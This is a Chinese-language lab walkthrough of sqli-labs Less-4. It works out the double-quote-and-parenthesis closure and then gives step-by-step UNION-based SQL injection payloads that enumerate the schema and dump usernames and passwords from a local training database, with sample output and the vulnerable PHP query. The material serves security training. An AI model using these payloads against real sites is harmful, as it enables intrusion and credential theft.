# SQLi Dumb Series Less-4

Less-4 是一个典型的 **双引号+括号闭合** 的联合查询注入漏洞，下面是完整的复现步骤：

---

#### 1. 环境准备

- 确保已部署好 `sqli-labs` 靶场，访问地址为 `http://127.0.0.1/sqli-labs/`

- 确认 MySQL 服务正常运行

---

#### 2. 判断闭合方式

1. **测试单引号闭合**：

访问 `http://127.0.0.1/sqli-labs/Less-4/?id=1'`

页面正常显示，无报错，说明不是单引号闭合。

1. **测试双引号闭合**：

访问 `http://127.0.0.1/sqli-labs/Less-4/?id=1"`

页面返回 SQL 语法错误：

```Plain Text

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"")' at line 1
```

从报错信息可以判断，后端 SQL 语句的闭合方式为 `")`（双引号 + 右括号）。

---

#### 3. 构造并执行注入 Payload

目标是通过 `UNION` 查询获取 `users` 表中的用户名和密码。

1. **判断列数**：

    ```Plain Text
    
    ?id=-1") union select 1,2,3--+
    ```

    页面正常显示，说明查询有 3 列。

2. **获取数据库名**：

    ```Plain Text
    
    ?id=-1") union select 1,2,database()--+
    ```

    得到数据库名 `security`。

3. **获取表名**：

    ```Plain Text
    
    ?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
    ```

    得到表名 `emails,referers,uagents,users`。

4. **获取列名**：

    ```Plain Text
    
    ?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
    ```

    得到列名 `id,username,password`。

5. **获取用户名和密码**：

    ```Plain Text
    
    ?id=-1") union select 1,2,group_concat(username,':',password) from users--+
    ```

    执行后，页面会显示所有用户的账号密码，例如：

    ```Plain Text
    
    Dumb:Dumb, Angelina:I-kill-you, Dummy:p@ssw0rd, secure:crappy, stupid:stupidity, superman:genious, batman:mob!le, admin:admin
    ```

---

#### 4. 原理分析

Less-4 的后端 SQL 语句大致为：

```PHP

$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=(\"$id\")";
```

当我们注入 `?id=-1") union select ...--+` 时，SQL 语句被拼接为：

```SQL

SELECT * FROM users WHERE id=("-1") union select 1,2,group_concat(username,':',password) from users--+")
```

原查询条件 `id=("-1")` 为假，`UNION` 后的查询结果被成功返回。
> （注：文档部分内容可能由 AI 生成）
